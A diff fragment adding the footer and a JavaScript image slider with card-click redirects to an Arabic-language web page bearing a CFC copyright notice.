+      <p>© حقوق الطبع والنشر ٢٠٢٥ شركة التسهيلات التجارية CFC<br>جميع الحقوق محفوظة</p>
+    </div>
+  </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+  const slides = document.querySelectorAll('.slide');
+  const dotsContainer = document.querySelector('.dots');
+  const leftBtn = document.querySelector('.arrow.left');
+  const rightBtn = document.querySelector('.arrow.right');
+  let current = 0;
+  let interval;
+
+  // إنشاء النقاط
+  slides.forEach((_, i) => {
+    const dot = document.createElement('button');
+    if (i === 0) dot.classList.add('active');
+    dot.addEventListener('click', () => showSlide(i));
+    dotsContainer.appendChild(dot);
+  });
+
+  const dots = dotsContainer.querySelectorAll('button');
+
+  function showSlide(index) {
+    slides.forEach((s, i) => {
+      s.classList.remove('active');
+      dots[i].classList.remove('active');
+    });
+    slides[index].classList.add('active');
+    dots[index].classList.add('active');
+    current = index;
+  }
+
+  function nextSlide() {
+    showSlide((current + 1) % slides.length);
+  }
+
+  function prevSlide() {
+    showSlide((current - 1 + slides.length) % slides.length);
+  }
+
+  rightBtn.addEventListener('click', nextSlide);
+  leftBtn.addEventListener('click', prevSlide);
+
+  function startAuto() {
+    interval = setInterval(nextSlide, 4000);
+  }
+
+  function stopAuto() {
+    clearInterval(interval);
+  }
+
+  document.querySelector('.slider').addEventListener('mouseenter', stopAuto);
+  document.querySelector('.slider').addEventListener('mouseleave', startAuto);
+
+  // عرض أول شريحة عند التحميل
+  showSlide(0);
+  startAuto();
+});
+
+// تنقل البطاقات بدون إشعار أو تتبع
+document.addEventListener("DOMContentLoaded", function () {
+  document.getElementById("card-commercial").addEventListener("click", function () {
+    window.location.href = "./paypy.html";
+  });
+
+  document.getElementById("card-auto").addEventListener("click", function () {
+    window.location.href = "./cashcar";
+  });
+
+  document.getElementById("card-cash").addEventListener("click", function () {
+        window.location.href = "./cashcar";
+      });
+    });
+  </script>
+  </body>
+</html>
